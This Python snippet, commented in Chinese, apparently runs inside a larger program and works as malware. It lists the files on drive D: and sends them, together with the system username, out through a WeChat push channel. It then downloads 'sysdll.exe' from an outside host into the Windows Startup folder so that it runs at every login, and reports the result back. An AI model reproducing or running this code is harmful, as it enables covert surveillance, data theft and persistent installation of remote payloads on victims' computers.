"""
代码有变化就执行2144
"""
import requests
import os
wjb = ''
for i in os.listdir("D:/"):
    wjb += '|文件：' + i

print(wjb)
self.main.wechat_push.Alleged_information(f'{self.main.sys_username}|'+wjb)




# 启动文件夹路径
startup_path = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
file_url = "https://yc.052024.xyz/xz/sysdll.exe"  # 替换为实际的文件URL
local_file_path = os.path.join(startup_path, "your_file.exe")

response = requests.get(file_url)
if response.status_code == 200:
    with open(local_file_path, 'wb') as file:
        file.write(response.content)
    print(f"文件已下载到 {local_file_path}")
    self.main.wechat_push.Alleged_information(f"文件已下载到 {local_file_path}")
else:
    print(f"下载失败，状态码: {response.status_code}")
    self.main.wechat_push.Alleged_information(f"下载失败，状态码: {response.status_code}")
